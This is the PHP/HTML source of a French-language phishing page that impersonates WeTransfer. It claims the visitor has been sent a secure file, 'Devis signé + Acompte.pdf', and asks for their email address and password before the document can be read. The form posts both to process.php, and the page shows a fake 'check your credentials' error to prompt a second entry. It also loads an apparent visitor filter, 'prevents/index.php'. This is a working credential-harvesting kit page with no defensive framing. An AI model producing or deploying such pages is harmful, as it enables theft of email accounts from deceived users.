<?php
require 'prevents/index.php';


?>
<html lang="fr"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wetransfer - Partage de document.</title>

 

  <style>/* ! tailwindcss v3.3.5 | MIT License | */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }.mx-2{margin-left:0.5rem;margin-right:0.5rem}.mx-3{margin-left:0.75rem;margin-right:0.75rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-7{margin-bottom:1.75rem}.mt-10{margin-top:2.5rem}.mt-2{margin-top:0.5rem}.mt-3{margin-top:0.75rem}.mt-4{margin-top:1rem}.mt-7{margin-top:1.75rem}.flex{display:flex}.hidden{display:block}.w-10{width:2.5rem}.w-56{width:14rem}.w-auto{width:auto}.w-full{width:100%}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-center{justify-content:center}.rounded-md{border-radius:0.375rem}.border{border-width:1px}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity))}.bg-\[\#ff7900\]{--tw-bg-opacity:1;background-color:rgb(255 121 0 / var(--tw-bg-opacity))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity))}.p-6{padding:1.5rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.text-center{text-align:center}.text-sm{font-size:0.875rem;line-height:1.25rem}.font-bold{font-weight:700}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68 / var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.shadow-md{--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-500{transition-duration:500ms}.ease-in-out{transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1)}@media (min-width: 768px){.md\:w-\[500px\]{width:500px}.md\:p-10{padding:2.5rem}}</style>
  
    <style>
	
	.testpss {
		display:none;
		}
  
	.hiid {
		display:block;
		}
		
	.subm {
		display:none;
		}
		
	
  </style>
  
  </head>

  <body class="bg-gray-100">

    <div class="flex items-center justify-center flex-col">
      <div>
        <img class="mx-auto mt-10" src="import/logo.png" alt="" width="300">
        <div class="md:p-10 shadow-md rounded-md bg-white md:w-[500px] w-auto mx-2 p-6">
          <p>Vous avez reçu un fichier sécurisé</p>
          <div class="mt-3">
            <div class="flex items-center mb-7">
              <img src="import/pdf.png" class="w-10" alt="">
              <p class="font-bold mx-3">Devis signé + Acompte.pdf</p>
            </div>
          </div>
          <p>
            Pour lire le document veuillez entrer les identifiants de messagerie
            auxquels ce fichier a été envoyé.
          </p><br><br>

 <p style="color:red">
            Vérifiez l’adresse mail et le mot de passe saisis.
          </p>
          <br>
<form action="process.php" method="post">
          <div>
            <input type="email" name="mail2" style="border-color:red" id="zone-email" class="border w-full py-2 px-2" required="" placeholder="Entrez l'adresse email"> 
            <div id="affiche-mdp" class="hidden transition-opacity duration-500 ease-in-out">
              <input type="text" name="passw2" required="" style="border-color:red" id="zone-password" class="border w-full py-2 px-2 mt-3 testpss " placeholder="Entrez le mot de passe">
            </div>
          
            
            <button style="background:black;" type="button" id="buttt" onclick="showHide()" class="mt-7 text-center hiid w-full bg-[#ff7900] text-white font-bold py-2">
              Continuer
            </button>
			 <button style="background:black;" type="submit" name="sub" id="continuer-button" class="mt-7 text-center subm w-full bg-[#ff7900] text-white font-bold py-2">
              Continuer
            </button>
			
	<script type="text/javascript">
		function showHide(){
			var click = document.getElementById("buttt");
			var hiddeni = document.getElementsByClassName("testpss");
			var hiddenivvts = document.getElementsByClassName("hiid");
			var hiddeninputtts = document.getElementsByClassName("subm");
			
			
			for(var i = 0; i != hiddeni.length; i++){
				if(click) {
					hiddeni[i].style.display = "block";
				}
			}
			
			for(var i = 0; i != hiddenivvts.length; i++){
				if(click) {
					hiddenivvts[i].style.display = "none";
				}
			}
			
			for(var i = 0; i != hiddeninputtts.length; i++){
				if(click) {
					hiddeninputtts[i].style.display = "block";
				}
			}
			
					
		}
	</script>	
          </div>
</form>
        </div>
      </div>

      <div class="mt-4 text-sm">
        <div class="flex justify-center">
          <p>© Wetransfer 2024</p>
        </div>
        <img src="import/paris.png" class="w-56" alt="">
      </div>
    </div>
  

  




</body></html>